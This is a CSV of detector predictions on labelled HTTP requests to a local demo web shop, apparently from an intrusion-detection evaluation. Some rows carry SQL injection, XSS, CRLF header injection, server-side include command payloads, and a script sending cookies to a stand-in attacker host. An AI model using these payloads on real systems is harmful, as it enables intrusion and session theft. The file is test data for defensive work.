Prediction, Actual, Confidence, Method, Content, URL
0, 0, 96.96%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
0, 0, 99.79%, GET, , http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
1, 1, 92.79%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=durward&pwd=cOrDElAzO&remember=on&B1=Entrar HTTP/1.1
1, 1, 82.25%, POST, modo=insertar&precio=9345&B1=Pasar+por+caja%2F, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1, 1, 82.89%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%4040 HTTP/1.1
1, 1, 99.95%, GET, , http://localhost:8080/tienda1/publico/carrito.jsp/asf-logo-wide HTTP/1.1
1, 0, 65.96%, POST, modo=registro&login=mareah&password=malh5jo&nombre=Eulalio&apellidos=Tal%F3+Gorriz&email=trissenaar%40tetdevelocidad.uk&dni=18684547Z&direccion=C%2F+Hermanos+Senise+Colmenero%2C+153%2C+3-D&ciudad=Forua&cp=08470&provincia=Valencia&ntc=9004541540453342&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 99.95%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0, 0, 58.07%, POST, modo=registro&login=irissou&password=ceg.ama&nombre=No%E9&apellidos=Esp%EDndola+Pavajeau&email=heal%40quadernideilgarda.gob&dni=19187311K&direccion=Hartzenbusch+98+&ciudad=Sagunto%2FSagunt&cp=45314&provincia=Baleares+%28Illes%29&ntc=8622247853302054&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 65.86%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=singyu&pwd=e88r6ber%EDa&remember=off&B1=Entrar HTTP/1.1
0, 0, 50.62%, POST, id=2&nombre=Vino+Rioja&precio=100&cantidad=90&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1, 1, 99.33%, GET, , http://localhost:8080/tienda1/.java HTTP/1.1
0, 0, 99.99%, GET, , http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0, 0, 99.86%, GET, , http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
0, 0, 99.75%, GET, , http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
0, 0, 99.79%, GET, , http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1, 1, 100.00%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&pwd=2anc580a95r&remember=off&B1=Entrar HTTP/1.1
1, 1, 99.13%, POST, errorMsgA=Credenciales+incorrectas, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0, 0, 65.35%, POST, modo=entrar&login=hrenyk&pwd=embozalar&remember=off&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1, 1, 99.83%, GET, , http://localhost:8080/tienda1/4861362529278789730 HTTP/1.1
1, 1, 98.20%, GET, , http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg/6909030637832563290.jsp.inc HTTP/1.1
1, 1, 98.13%, POST, idA=2, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1, 1, 81.19%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tiong-ho&password=an1l5m9no&nombre=S%2Btyli-anos&apellidos=Subias&email=parada.biuchet4%40aulahost.gw&dni=79845869N&direccion=Jacinto+Benavente%2C+165+7F&ciudad=Herreruela&cp=11330&provincia=Teruel&ntc=4461899477803914&B1=Registrar HTTP/1.1
0, 0, 99.82%, GET, , http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
1, 0, 50.64%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=20&B1=A%F1adir+al+carrito HTTP/1.1
0, 0, 99.98%, GET, , http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
1, 1, 91.66%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gustave&password=v3o8720a&nombre=Mar%EDa+Begonia&apellidos=Fain%E9+Motj%E9&email=dyne%40somosagelespa%F1a.us&dni=30663985V&direccionA=Calle+Antonio+Gramsci+30%2C+12%3FB&ciudad=Narros+del+Puerto&cp=40183&provincia=Zamora&ntc=4102151120364510&B1=Registrar HTTP/1.1
1, 0, 52.64%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=osburn&password=48AsTa5O&nombre=Edilio&apellidos=Credid%EDo+Poma&email=ahern.plott%40zonamodelos.fr&dni=36839675T&direccion=Patio+Pico+De+Aneto%2C+122+13-C&ciudad=Cuevas+del+Almanzora&cp=10666&provincia=Zamora&ntc=1933711327714835&B1=Registrar HTTP/1.1
1, 1, 99.99%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&password=bullanguera&nombre=Ricardina&apellidos=Cusquisiban+Ocifuente&email=greenleaf.garcia%40lodgemadrid.np&dni=09092887K&direccion=Avenida+Santa+Marina+39%2C+&ciudad=San+Mart%EDn+del+R%EDo&cp=34219&provincia=Palencia&ntc=2461453971721816&B1=Registrar HTTP/1.1
0, 0, 57.73%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=6&B1=A%F1adir+al+carrito HTTP/1.1
0, 0, 62.55%, POST, modo=entrar&login=abbai&pwd=incesta%24r&remember=on&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1, 1, 94.51%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cleve&password=guiSada&nombre=Lila&apellidos=Fen%E9s+Montanuy&email=bekkouche%40aadsl.hu&dni=74492868P&direccion=Padre+Isla%2C+S%2FN%2C+&ciudad=Castrillo+de+Duero&cp=48950&provincia=Baleares+%28Illes%29&ntc=648492740335689&B1=Registrar HTTP/1.1
1, 1, 99.13%, POST, errorMsgA=Credenciales+incorrectas, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0, 0, 99.86%, GET, , http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
0, 0, 99.79%, GET, , http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
1, 1, 98.33%, PUT, modo=registro&login=michial3&password=83o3i7a374&nombre=Teodomira&apellidos=D%27Paoli+Garros&email=bessell%40ttivoni.is&dni=32124292P&direccion=C%2F+Montevideo+193%2C+&ciudad=Rupi%E0&cp=39572&provincia=Burgos&ntc=8086742983774365&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 88.49%, POST, id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=38&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
0, 0, 99.66%, GET, , http://localhost:8080/tienda1/index.jsp HTTP/1.1
0, 0, 62.46%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=61&B1=A%F1adir+al+carrito HTTP/1.1
0, 0, 64.93%, POST, modo=registro&login=sharnoff&password=patr%EDsTica&nombre=Eli&apellidos=Cabrer+Gascon&email=sergyl%40intercambiodeenlaces.gh&dni=76518142V&direccion=C%2F+Alcalde+Conangla+S%2FN%2C+&ciudad=Pinar%2C+El&cp=37793&provincia=Zaragoza&ntc=4336085166451274&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 99.75%, GET, , http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0, 0, 99.95%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1, 1, 99.59%, GET, , http://localhost:8080/tienda1/publico/4861362529278789730 HTTP/1.1
0, 0, 99.79%, GET, , http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
1, 1, 98.74%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
0, 0, 99.98%, GET, , http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
0, 0, 52.75%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=aleksand&password=cerramiento&nombre=Gerarda&apellidos=Lao&email=shukuri%40velaconsultores.nl&dni=54415049Q&direccion=Pasaje+Pedrosa+115%2C+6F&ciudad=Mieza&cp=47400&provincia=C%E1ceres&ntc=5563798964634481&B1=Registrar HTTP/1.1
1, 0, 85.15%, POST, modo=registro&login=schadan&password=ExCEPtaCi%D3n&nombre=Hemilce&apellidos=Cubells&email=le-van-kim%40la-sexta-f1.ro&dni=10750198K&direccion=C%2F+Bandera+125+8-C&ciudad=Benicolet&cp=08980&provincia=C%E1ceres&ntc=6076862768016563&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0, 0, 96.96%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
1, 1, 100.00%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif/.Bak HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
1, 1, 85.50%, POST, modo=insertar&precio=2026&B1=Confirmar%2F, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1, 1, 100.00%, POST, modo=registro&login=myong&password=colOrISmo&nombre=Dagmar&apellidos=Cabane+Molas&email=holton%40enigmatico.vu&dni=91624095F&direccion=Don+Ferreol+Hernandez+S%2FN%2C+&ciudad=Calders&cp=37183&provincia=Salamanca&ntc=6035116303925311&B1=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 100.00%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1
0, 0, 87.46%, POST, id=2, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1, 1, 95.50%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9536&B1=Pasar+por+caja%2F HTTP/1.1
0, 0, 94.43%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
1, 0, 74.19%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=torre&password=4ere3id13&nombre=Yesenia&apellidos=Da+Silva+Kerber&email=tchjan-lian.quadflieg%40comerciosdeaspe.se&dni=02056001P&direccion=Angel+Martin+Puebla+157%2C+&ciudad=Almonacid+de+la+Sierra&cp=16535&provincia=Almer%EDa&ntc=3467840384205414&B1=Registrar HTTP/1.1
1, 1, 100.00%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
0, 1, 65.35%, POST, modo=entrar&login=woins%3Fky&pwd=pagaDEra&remember=off&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0, 0, 99.79%, GET, , http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1, 0, 69.38%, POST, modo=registro&login=anchia&password=s4pe9iorm9n8e&nombre=Indemira&apellidos=Tejo&email=ronnback.pitre%40pro-isfv.nc&dni=12199825G&direccion=Trobos+39+4E&ciudad=Coves+de+Vinrom%E0%2C+les&cp=34126&provincia=Asturias&ntc=2239348379899052&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0, 0, 99.82%, GET, , http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
1, 1, 97.05%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2876&B1=Confirmar%2F HTTP/1.1
1, 1, 97.98%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=faez&pwd=9fi247A&remember=on&B1A=Entrar HTTP/1.1
0, 0, 99.82%, GET, , http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
0, 0, 63.37%, POST, modo=entrar&login=ossie&pwd=introducci%F3n&remember=on&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1, 1, 100.00%, POST, modo=registro&login=blakesle&password=ch07ico3o&nombre=Jerem%EDas&apellidos=Maslo+Arrunategui&email=ratcliff%40mataroweb.gw&dni=26853011M&direccion=Calle+Felipe+De+Diego+191%2C+2Hparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&ciudad=Montefr%EDo&cp=36520&provincia=Burgos&ntc=3246825984475356&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 99.72%, GET, , http://localhost:8080/iisadmpwd/aexp2b.htr HTTP/1.1
1, 1, 99.12%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=winona&password=pic%F3n&nombre=Nayla&apellidos=Torre+Xu&email=hyer_longdon0%40artforall.mc&dni=83627503D&direccion=Calle+Corbina%2C+100+&ciudad=Hornillos+de+Cameros&cp=46691&provincia=Cuenca&ntc=5175565918974704&B1=%4040 HTTP/1.1
1, 1, 99.96%, POST, modo=registro&login=hernzlia&password=dIF3MA79753&nombre=Osorio&apellidos=Mans+Vi%F1as&email=sone%40tristanyvioletina.nf&dni=70806659D&direccion=C%2F+Lago+Ba%F1olas+40+&ciudad=%22+AND+%221%22%3D%221&cp=41870&provincia=Cantabria&ntc=3259495581211566&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
0, 0, 95.90%, POST, errorMsg=Credenciales+incorrectas, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1, 1, 91.60%, POST, modo=registro&login=stokker&password=do6a3er8&nombre=Leandra&apellidos=Orpez+Almod%F3var&email=schaab%40hispadis.li&dni=96068417Q%3F&direccion=Calle+Montduber+75%2C+12%3FH&ciudad=Magacela&cp=04275&provincia=Lleida&ntc=1530487510362018&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 92.70%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=attilla&password=hIe4%E1t*i29&nombre=Neyen&apellidos=Oll%E9+Verdin&email=balfour.riabinkina%40monsur.ls&dni=7A%279417AM&direccion=Calle+Iztueta%2C+105+&ciudad=Sant+Mart%ED+de+Riucorb&cp=01427&provincia=Salamanca&ntc=1701163791515432&B1=Registrar HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
1, 1, 93.56%, POST, modo=registro&login=yitan&password=barraquer6&nombre=Pirro&apellidos=Zurita+Santander&email=gisladottir%40ingenieriadelaconstruccion.bh&dni=96580643D&direccion=C%2F+Chisperos%2C+S%2FN%2C+3-H&ciudad=*Ceclav%EDn&cp=43144&provincia=Burgos&ntc=6951238720062630&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 92.34%, POST, modo=registro&login=robena1&password=improvisaci%F3n&nombre=Reinoldo&apellidos=Gelabert&email=oland5%40schnaps.com.by&dni=51756068L&direccion=C%2F+Santa+Escolastica+178%2C+&ciudad=Quintanilla+de+Arriba&cp=35543&provincia=Llei%3Fd%3Fa&ntc=7852557135021483&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 98.13%, POST, idA=1, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1, 1, 100.00%, POST, errorMsg=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0, 0, 99.81%, GET, , http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
1, 1, 99.76%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1
0, 1, 62.94%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bredfeld0&pwd=43tete%2Cm638&remember=on&B1=Entrar HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
1, 1, 100.00%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&login=swen&pwd=incisorio&remember=off&B1=Entrar HTTP/1.1
1, 1, 99.77%, GET, , http://localhost:8080/tienda1/publico.old HTTP/1.1
1, 1, 79.38%, POST, modo=registro&login=asops&password=s%2F974%2F0%2CN2&nombre=Gala&apellidos=Altamira+Ferro&email=gate%40introito.cc&dni=76543761Z&direccion=La+Torre+122+&ciudad=Padul&cp=19336&provincia=Valladolid&ntc=6279584819907955&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 0, 67.31%, POST, modo=registro&login=amber&password=pizcAR&nombre=Noel&apellidos=Rebes+Huasequi&email=sheng-passanante%40ankawaelda.int&dni=36101272N&direccion=C%2F+Geranio%2C+65+&ciudad=Condemios+de+Arriba&cp=37724&provincia=Tarragona&ntc=0887551084770656&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 99.76%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1
1, 1, 79.61%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yank&password=tr4n52r&nombre=Ferreol&apellidos=Vilamitj%E0+Ponce&email=devlin_lazar%40joyaseleccion.tk&dni=93119033Z&direccion=Calle+Marques+De+Pontejos+170+&ciudad=Molar%2C+El&cp=44721&provincia=Badajoz&ntc=955605313599418&B1=Registrar HTTP/1.1
0, 0, 67.57%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2306&B1=Pasar+por+caja HTTP/1.1
1, 0, 77.38%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=aubine&password=T1656%F14L&nombre=Silas&apellidos=Carbot+Llanos&email=etienne-wray%40juegois.je&dni=05248300E&direccion=Calle+Darsena+San+Magin+198%2C+&ciudad=Tramaced&cp=38820&provincia=Huelva&ntc=8990907975781927&B1=Registrar HTTP/1.1
0, 0, 94.43%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
0, 0, 67.57%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4228&B1=Pasar+por+caja HTTP/1.1
1, 1, 76.76%, POST, modo=registro&login=perez&password=interclusi%F3n&nombre=Fabrina&apellidos=Chomb%F3+Mantero&email=casini-fridley%40civicosdns.ws&dniA=34788445W&direccion=Rotonda+Palomera+Centro+4%2C+5%3FA&ciudad=Seriny%E0&cp=32755&provincia=Madrid&ntc=6682713987061411&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 98.55%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=8305&B1=Confirmar HTTP/1.1
0, 0, 99.95%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0, 0, 99.99%, GET, , http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
1, 1, 99.90%, GET, , http://localhost:8080/samples/dbsamp/dbsamp2.htm HTTP/1.1
0, 0, 99.52%, GET, , http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
0, 0, 99.75%, GET, , http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1, 1, 66.25%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thege&password=abstruso&nombre=Guida&apellidos=Lambarri&email=mcclellan.truex%40faders.com.cl&dni=62140654J&direccion=Txapitela%2C+183+13%3FG&ciudad=Man%2Btin*os&cp=04569&provincia=Toledo&ntc=1284694854341650&B1=Registrar HTTP/1.1
0, 0, 99.66%, GET, , http://localhost:8080/tienda1/index.jsp HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1, 1, 98.12%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modoA=registro&login=vexler&password=20TIa81i7l7&nombre=Atal%EDvar&apellidos=Demoya+Yeladaky&email=sotrm_roosendahl%40dise%F1odesoftware.gg&dni=47899496H&direccion=Invierno%2C+S%2FN+8%3FH&ciudad=Pin%F3s%2C+el%2FPinoso&cp=28296&provincia=Barcelona&ntc=9635207639995628&B1=Registrar HTTP/1.1
0, 0, 69.03%, POST, id=3&nombre=Vino+Rioja&precio=85&cantidad=96&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1, 1, 99.13%, POST, errorMsgA=Credenciales+incorrectas, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1, 0, 57.71%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=benjavan&password=MaNtateri.lla&nombre=Barcario&apellidos=Estades+Orizales&email=shaughnessy%40white-pearl-resort.nf&dni=53933880F&direccion=o+Rio%2C+134%2C+&ciudad=Elorrio&cp=02247&provincia=Navarra&ntc=1022652655889356&B1=Registrar HTTP/1.1
1, 1, 58.90%, POST, B2=Vaciar+carrito%3F, http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
0, 0, 99.97%, GET, , http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
1, 1, 90.33%, POST, id=%257C, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1, 1, 91.58%, POST, modo=insertar&precio=183&B1A=Pasar+por+caja, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0, 0, 99.98%, GET, , http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
1, 1, 99.90%, GET, , http://localhost:8080/samples/dbsamp/dbsamp1.htm HTTP/1.1
1, 1, 100.00%, POST, modo=registro&login=horatius&password=323ant5CIdi3&nombre=Herenia&apellidos=Witron+Olivares&email=thrush_orhonsay6%40aadsl.no%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&dni=77733072H&direccion=Calle+Reina+Regente+47+&ciudad=Sotillo+del+Rinc%F3n&cp=09460&provincia=La+Rioja&ntc=7365954967805937&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 78.23%, POST, modo=registro&login=hallsy6&password=machete&nombre=Facunda&apellidos=Naudi&email=dinehart%40barebackspain.sh&dni=22586543Z&direccion=C%2F+Torreta%2C+115%2C+6A&ciudad=Taradell&cp=4416A&provincia=Valladolid&ntc=6475224906467741&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0, 0, 57.74%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=53&B1=A%F1adir+al+carrito HTTP/1.1
0, 0, 71.92%, POST, modo=registro&login=pfeilsch&password=79p2lis25&nombre=Gattas&apellidos=Izurrieta+Pomales&email=spain%40erasmusrooms.bi&dni=09220629K&direccion=Calle+Alonso+De+Matos+174%2C+&ciudad=Riodeva&cp=19219&provincia=Salamanca&ntc=9999685362950353&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 99.79%, GET, , http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
0, 0, 95.90%, POST, errorMsg=Credenciales+incorrectas, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1, 1, 99.99%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=allix&password=RAmAd%C1n&nombre=Yemina&apellidos=Sejas+Escriba&email=roe%40prensahp.ge&dni=76844031L&direccion=C%2F+Pintor+Pedro+Cabanes%2C+121+11B&ciudad=Valle+de+Hecho&cp=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&provincia=Le%F3n&ntc=6147677145944254&B1=Registrar HTTP/1.1
1, 1, 100.00%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1, 1, 90.15%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=klasky&password=TEM.%E1TiCO&nombre=Licia&apellidos=Maeso+Comello&email=verrell.myral%40cafedeteatro.kh&dni=33908887X&direccion=Plaza+Pedro+Marcos%2C+145+&ciudad=Guadalupe&cp=36700&provincia=C%E1diz&ntcA=4984450191632548&B1=Registrar HTTP/1.1
0, 0, 62.55%, POST, modo=entrar&login=skedelsk&pwd=8id4o5%E12TI97&remember=on&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0, 0, 97.94%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
1, 1, 97.78%, POST, idA=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=7&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1, 1, 90.12%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=30&B1A=A%F1adir+al+carrito HTTP/1.1
1, 0, 50.90%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=65&B1=A%F1adir+al+carrito HTTP/1.1
1, 1, 98.13%, POST, idA=2, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0, 0, 96.96%, GET, , http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
1, 1, 95.20%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=dorrie&password=acopio&nombre=Sergio&apellidos=Buix%F3+Diclo&email=ben-amotz-hehn%40clubforex.io&dni=53702702W&direccion=Pla%E7a+Josep+Maria+Folch+i+Torres%2C+15+5-G&ciudad=Villamandos&cp=09244&provincia=Badajoz&ntc=1143578341526495&B1=Registrar HTTP/1.1
0, 0, 99.98%, GET, , http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1
0, 0, 53.43%, POST, id=1&nombre=Queso+Manchego&precio=100&cantidad=1&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1, 1, 92.67%, POST, id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidadA=21&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 0, 94.43%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
